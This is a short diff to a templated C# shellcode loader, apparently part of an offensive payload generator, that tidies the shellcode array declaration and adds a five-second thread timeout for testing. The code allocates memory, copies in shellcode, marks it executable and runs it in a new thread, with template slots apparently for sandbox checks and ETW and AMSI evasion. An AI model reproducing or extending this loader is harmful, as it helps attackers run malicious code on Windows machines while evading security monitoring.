@@ -40,18 +40,14 @@ namespace {{ namespace }}
 {{ sandbox_block }}
 {{ etw_block }}
 {{ amsi_block }}
-            {% if is_encrypted %}
             byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
-            {% else %}
-            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
-            {% endif %}
 {{ decrypt_block }}
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x04);
             Marshal.Copy(buf, 0, addr, buf.Length);
             uint _vp;
             VirtualProtect(addr, (uint)buf.Length, 0x20, out _vp);
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            WaitForSingleObject(hThread, 5000); // 5s timeout for testing
         }
     }
 }
